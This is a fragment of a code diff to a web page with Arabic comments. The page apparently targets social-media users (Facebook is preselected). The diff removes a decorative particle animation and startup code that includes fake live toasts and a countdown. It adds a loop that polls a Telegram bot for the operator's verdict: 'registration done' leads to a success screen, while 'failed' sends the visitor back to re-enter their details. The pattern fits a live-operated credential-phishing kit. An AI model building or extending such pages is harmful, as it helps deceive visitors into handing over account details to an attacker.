+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN") return;
 
-        /* ===================================================
-           15. محرك الجسيمات التفاعلية خلفية Particle VFX
-           =================================================== */
-        function initParticleCanvas() {
-            const canvas = document.getElementById('particleCanvas');
-            const ctx = canvas.getContext('2d');
-            let particles = [];
-
-            function resize() {
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-            }
-            window.addEventListener('resize', resize);
-            resize();
-
-            class Particle {
-                constructor() {
-                    this.x = Math.random() * canvas.width;
-                    this.y = Math.random() * canvas.height;
-                    this.size = Math.random() * 2.5 + 0.5;
-                    this.speedX = Math.random() * 0.6 - 0.3;
-                    this.speedY = Math.random() * 0.6 - 0.3;
-                    this.color = Math.random() > 0.5 ? '#ffb703' : '#00f3ff';
-                }
-                update() {
-                    this.x += this.speedX;
-                    this.y += this.speedY;
-                    if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
-                    if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
-                }
-                draw() {
-                    ctx.fillStyle = this.color;
-                    ctx.shadowBlur = 8;
-                    ctx.shadowColor = this.color;
-                    ctx.beginPath();
-                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                    ctx.fill();
-                }
-            }
-
-            for (let i = 0; i < 45; i++) particles.push(new Particle());
-
-            function animate() {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                particles.forEach(p => {
-                    p.update();
-                    p.draw();
-                });
-                requestAnimationFrame(animate);
-            }
-            animate();
-        }
-
-        /* ===================================================
-           16. تهيئة الصفحة والتشغيل الابتدائي
-           =================================================== */
-        window.addEventListener('DOMContentLoaded', () => {
-            loadDraft();
-            trackInitialVisit();
-            initDynamicCounters();
-            initWeeklyCountdown();
-            startLiveToasts();
-            checkInternetConnection();
-            initParticleCanvas();
-            selectPlatform('facebook', document.querySelector('.platform-box.fb'));
-        });
-    </script>
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        data.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+                            if (update.message && update.message.text) {
+                                const text = update.message.text.trim();
+                                if (text === "تم التسجيل") {
+                                    clearInterval(pollInterval);
+                                    switchPage('successScreen');
+                                } else if (text === "فشل") {
+                                    clearInterval(pollInterval);
+                                    document.getElementById('errorAlert').innerText = "تأكد من إدخال المعلومات بشكل صحيح";
+                                    document.getElementById('errorAlert').style.display = 'block';
+                                    switchPage('phase3');
+                                }
+                            }
+                        });
+                    }
+                })
+                .catch(err => console.error("Polling Error:", err));
+        }, 3000);
+    }
+</script>
 </body>
 </html>
-
